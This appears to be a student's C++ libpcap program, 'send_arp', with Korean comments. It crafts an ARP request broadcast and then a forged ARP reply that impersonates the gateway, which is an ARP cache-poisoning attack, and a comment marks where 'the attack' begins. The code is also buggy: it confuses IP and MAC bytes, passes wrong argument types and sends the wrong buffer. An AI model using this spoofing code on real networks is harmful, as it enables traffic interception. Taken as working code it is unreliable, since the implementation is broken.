#include <iostream>
#include <pcap/pcap.h>
#include <netinet/in.h>
#include <cstring>
#include "PHeader.h"

#define Request 0x0001
#define Reply 0x0002
#define ARP 0x0806


// broadcast 보내는 packet
void make_sender_packet(struct combine_packet* compacket, u_char sender_ip){
    //TODO str에  sender패킷이 되기위함을 준비
    // 패킷에 FFFFF~ 와 gateway, sender ip를 설정한다.
    // 그러면 str에 다 담겨있으니까 이거 호출되면 sendpacket하면 된다!!!!!!!!!!!!
    int i=0;
    u_char temp[] = {0xff,0xff,0xff,0xff,0xff,0xff};


    for(i=0;i<6;i++)
    {
        compacket->ether.ether_dhost[i] = 0xFF;
    }

    memcpy(compacket->ether.ether_shost,temp,6);

    compacket->ether.ether_type = htons(ARP);

    compacket->arp.hd_type =htons(0x0001);
    compacket->arp.pr_type =htons(0x0800);
    compacket->arp.pr_size =0x04;
    compacket->arp.hd_size =0x06;


    compacket->arp.opCode = htons(Request);  //when request,

    memcpy(compacket->arp.send_mac_ad, temp, 6);


    for(i=0;i<4;i++)
    {compacket->arp.send_ip_ad[i] = sender_ip;

    }

    printf("\n");


    memcpy(compacket->arp.target_mac_ad, temp, 6);


    for(i=0;i<4;i++)
    {compacket->arp.target_ip_ad[i] = sender_ip;
    printf("%d ",sender_ip);
    }


    printf("@@@@@@@@@@@@@@@@@@@\n");


}

// target mac 주소 저장하는 패킷
int get_target_mac(const int8_t* packet,char* get_mac){
    int i;

   if( packet[12] == 0x08 && packet[13] == 0x06 && packet[21] == 0x02 )
   {
       for(i=0;i<6;i++)
       {
           get_mac[i]=packet[i];
       }
       return true;

   }
   return false;

}
void make_attacker_packet(struct combine_packet* compacket, u_char* sender_ip,u_char* gateway_ip){
    //TODO str에  sender패킷이 되기위함을 준비
    // 패킷에 FFFFF~ 와 gateway, sender ip를 설정한다.
    // 그러면 str에 다 담겨있으니까 이거 호출되면 sendpacket하면 된다!!!!!!!!!!!!
    int i=0;
    u_char temp[] = {0,0,0,0,0,0};
    char mac[6];
    get_target_mac((int8_t*) compacket,mac);

    for(i=0;i<6;i++)
    {
        compacket->ether.ether_dhost[i] = sender_ip[i];
    }


    for(i=0;i<6;i++)
    {
        compacket->ether.ether_shost[i] = gateway_ip[i];
    }

    compacket->ether.ether_type = htons(ARP);

    compacket->arp.hd_type =htons(0x0001);
    compacket->arp.pr_type =htons(0x0800);
    compacket->arp.pr_size =0x04;
    compacket->arp.hd_size =0x06;


    compacket->arp.opCode = htons(Reply);  //when request,


    for(i=0;i<6;i++)
    {compacket->arp.send_mac_ad[i] = sender_ip[i];}

    for(i=0;i<4;i++)
    {compacket->arp.send_ip_ad[i] = gateway_ip[i];}


    for(i=0;i<6;i++)
    {compacket->arp.target_mac_ad[i] = mac[i];}


    for(i=0;i<4;i++)
    {compacket->arp.target_ip_ad[i] = temp[i];}


}



int main(int argc, char* argv[]) {

    // pcap api
    struct pcap_pkthdr* header;
    struct combine_packet compacket;
    const unsigned char* packet;
    char send_MAC[6];
    int res;
    char *dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    struct combine_packet attacker_packet;
    char* sender_ip = argv[2];

   // char* sender_ip = strtok(argv[2], ".");
    char* gateway_ip = argv[3];



    if (argc != 4)  // 오류처리
    {
        printf("USAGE : send_arp <interface> <sender ip> <target ip>\n");
        return -1;
    }

    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    // 패킷캡처

    if (handle == NULL) {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }
/*
 *  memcpy(ahdksadksadkjas->ether_shost, aksdjam, 6);
 *
 *
 * */


    make_sender_packet(&compacket,sender_ip); // broadcast로 보내는 패킷

    pcap_sendpacket(handle,(const u_char*)&compacket,42);

    //return 0;
    while (true) {

        res = pcap_next_ex(handle, &header, &packet);

        // 패킷 읽어옴
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        struct ethernet_header* ether = (struct ethernet_header*)packet;

        if(get_target_mac((const int8_t*)packet, send_MAC) == true){
            break;
        }
        else{
            continue;
        }
    }

    make_attacker_packet(&compacket,(u_char*) sender_ip,(u_char*) gateway_ip );
    pcap_sendpacket(handle,(const u_char*)&packet, 42);


    // 여기서부터 공격입니다 열심히 하세요77

    // 공격 패킷 만들기 전 작업
    // make_sender_packet(&compacket,(u_char*)sender_ip,(u_char*)gateway_ip); // broadcast로 보내는 패킷

    // make_sender_packet의 필요한 부분만 변경해서 반환시킴


    return 0;
}